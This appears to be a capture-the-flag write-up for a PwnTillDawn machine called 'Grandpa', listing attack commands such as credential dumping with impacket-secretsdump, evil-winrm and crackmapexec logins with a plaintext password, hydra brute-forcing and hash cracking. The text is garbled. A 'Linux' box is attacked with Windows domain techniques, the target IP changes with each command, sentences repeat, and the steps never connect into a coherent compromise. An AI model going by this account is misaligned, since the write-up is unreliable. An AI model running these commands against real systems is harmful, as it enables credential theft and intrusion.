---
TitleSEO: "PwnTillDawn — Grandpa (Medium Linux) | ZureFX"
TitlePost: "PwnTillDawn — Grandpa (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Grandpa. Constrained Delegation and AS-REP Roasting to achieve medium compromise on Linux."
Keywords: "offsec, hard, ctf, easy"
URL: "https://zurefx.github.io/writeups/htb-grandpa-863.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-grandpa-863/"
Date: "2024-04-09"
Tags: "OffSec, Hard, CTF, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-grandpa-863"
Permalink: "/writeups/htb-grandpa-863.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Grandpa** is rated **Medium** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.16.132.140`.

### Objectives

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.36.227.206/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.127.168.133/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.94.140.87/FUZZ
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

### Service Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.87.185.250
```

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.91.6.12/FUZZ
feroxbuster -h
gobuster dir -u http://10.60.223.134/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **AS-REP Roasting**.

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.68.182.44/FUZZ
evil-winrm -i 10.47.188.25 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.80.61.18 -u administrator -p 'P@ssw0rd!' --shares
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.212.239
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.231.172 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.71.179.151
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p445,9200,135 10.75.128.231 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `dcomexec`
- `msfvenom`
- `lookupsid`
- `hydra`

### Key Takeaways

- Constrained Delegation
- AS-REP Roasting
- SeDebugPrivilege
